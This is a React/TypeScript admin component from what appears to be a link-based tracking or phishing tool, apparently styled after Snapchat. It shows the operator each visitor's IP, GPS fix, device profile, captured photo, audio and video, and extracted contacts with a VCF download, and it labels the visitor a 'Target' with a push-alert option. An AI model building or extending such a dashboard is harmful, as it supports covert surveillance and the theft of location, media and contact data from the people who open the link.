// components/admin/VisitorSessionCard.tsx
"use client";

import React, { useState } from "react";
import { Card } from "@/components/ui/Card";
import { Badge } from "@/components/ui/Badge";
import { Button } from "@/components/ui/Button";
import { LocationSession } from "@/lib/types";
import { formatDate } from "@/lib/utils";
import { getSnapImageUrl } from "@/lib/storage";
import { SessionHardwareGrid } from "./SessionHardwareGrid";
import { SessionMediaGallery } from "./SessionMediaGallery";
import { SendPushModal } from "./SendPushModal";
import {
  ExternalLink,
  MapPin,
  Users,
  Download,
  ChevronDown,
  ChevronUp,
  Bell,
} from "lucide-react";

interface VisitorSessionCardProps {
  session: LocationSession;
}

export const VisitorSessionCard: React.FC<VisitorSessionCardProps> = ({ session }) => {
  const [showContacts, setShowContacts] = useState(false);
  const [showPushModal, setShowPushModal] = useState(false);

  const latestCoord = session.location_updates?.[session.location_updates.length - 1];
  const capturedData = (session.captured_data as any) || {};
  const contactsList = capturedData.contacts || [];
  const vcfPath = capturedData.contacts_vcf_path;
  const vcfUrl = vcfPath ? getSnapImageUrl(vcfPath) : null;
  const hasPush = Boolean(session.push_subscription);

  return (
    <Card variant="glass" className="p-4 sm:p-5 space-y-4">
      {/* Top Header */}
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-white/5 pb-3">
        <div className="flex items-center gap-2">
          <Badge variant={session.status === "active" ? "live" : "expired"}>
            {session.status === "active" ? "Active" : "Completed"}
          </Badge>
          <span className="text-xs font-mono text-white/80 font-bold">
            IP: {session.ip_address || "Unknown"}
          </span>
          <span className="text-[11px] font-mono font-bold px-2 py-0.5 rounded-md bg-[#FFFC00]/15 text-[#FFFC00] border border-[#FFFC00]/30">
            {session.visit_count && session.visit_count > 1 ? `Visit #${session.visit_count}` : "Visit #1"}
          </span>
        </div>

        <div className="flex items-center gap-2">
          {hasPush && (
            <Button
              size="sm"
              variant="secondary"
              onClick={() => setShowPushModal(true)}
              className="h-7 text-[11px] gap-1 px-2.5 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 border border-rose-500/20"
            >
              <Bell className="w-3 h-3" /> Push Alert
            </Button>
          )}
          <span className="text-xs text-white/40 font-mono">
            {formatDate(session.last_visited_at || session.consent_at)}
          </span>
        </div>
      </div>

      {/* Grid info: Coordinates & Deep Hardware */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-4">
        {/* Location & GPS */}
        <div className="space-y-2 bg-slate-50 dark:bg-white/[0.03] p-3.5 rounded-2xl border border-slate-200/80 dark:border-white/5">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2 text-xs font-bold text-slate-900 dark:text-white">
              <MapPin className="w-3.5 h-3.5 text-amber-600 dark:text-[#FFFC00]" />
              <span>GPS Coordinates</span>
            </div>
            {latestCoord && (
              <a
                href={`https://www.google.com/maps?q=${latestCoord.latitude},${latestCoord.longitude}`}
                target="_blank"
                rel="noopener noreferrer"
              >
                <Button variant="secondary" size="sm" className="h-7 text-[11px] gap-1 px-2.5 border-slate-200 dark:border-white/10 text-slate-800 dark:text-white">
                  <ExternalLink className="w-3 h-3" />
                  Google Maps
                </Button>
              </a>
            )}
          </div>

          {latestCoord ? (
            <div className="space-y-0.5 text-xs font-mono text-slate-700 dark:text-white/70">
              <p className="text-amber-700 dark:text-[#FFFC00] font-bold">
                {latestCoord.latitude.toFixed(6)}, {latestCoord.longitude.toFixed(6)}
              </p>
              <p className="text-[11px] text-slate-500 dark:text-white/40">
                Accuracy: ±{Math.round(latestCoord.accuracy || 0)}m • {session.location_updates?.length || 1} update(s)
              </p>
            </div>
          ) : (
            <p className="text-xs text-slate-400 dark:text-white/40">No coordinates transmitted yet.</p>
          )}
        </div>

        {/* Deep Device & Hardware Profile */}
        <SessionHardwareGrid dev={session.device_info} />
      </div>

      {/* Captured Multi-Media (Photo, Audio Memo, Video Burst) */}
      <SessionMediaGallery
        photoPath={session.captured_media_path}
        audioPath={session.captured_audio_path}
        videoPath={session.captured_video_path}
        visitorIp={session.ip_address}
      />

      {/* Captured Contacts (if present) */}
      {capturedData.contacts_count > 0 && (
        <div className="p-3 bg-slate-50 dark:bg-white/[0.03] rounded-2xl border border-slate-200/80 dark:border-white/5 space-y-2">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2 text-xs font-bold text-slate-900 dark:text-white">
              <Users className="w-3.5 h-3.5 text-amber-600 dark:text-[#FFFC00]" />
              <span>Extracted Contacts ({capturedData.contacts_count})</span>
            </div>
            <div className="flex items-center gap-2">
              {vcfUrl && (
                <a href={vcfUrl} download={`contacts_${session.id}.vcf`}>
                  <Button variant="primary" size="sm" className="h-7 text-[11px] gap-1 px-2.5">
                    <Download className="w-3 h-3 text-black" />
                    Download (.VCF)
                  </Button>
                </a>
              )}
              <Button
                onClick={() => setShowContacts(!showContacts)}
                variant="ghost"
                size="sm"
                className="h-7 text-[11px] px-2"
              >
                {showContacts ? <ChevronUp className="w-3 h-3" /> : <ChevronDown className="w-3 h-3" />}
              </Button>
            </div>
          </div>

          {showContacts && contactsList.length > 0 && (
            <div className="max-h-48 overflow-y-auto space-y-1.5 pt-1 pr-1">
              {contactsList.map((c: any, i: number) => (
                <div key={i} className="p-2 bg-slate-100 dark:bg-black/40 rounded-xl text-xs font-mono flex justify-between">
                  <span className="font-bold text-slate-900 dark:text-white truncate">{c.name?.[0] || "Unnamed"}</span>
                  <span className="text-amber-700 dark:text-[#FFFC00]">{c.tel?.[0] || c.email?.[0] || "—"}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* Send Push Modal */}
      {hasPush && (
        <SendPushModal
          isOpen={showPushModal}
          linkId={session.link_id}
          sessionId={session.id}
          visitorLabel={`Visitor ${session.ip_address || "Target"}`}
          onClose={() => setShowPushModal(false)}
        />
      )}
    </Card>
  );
};
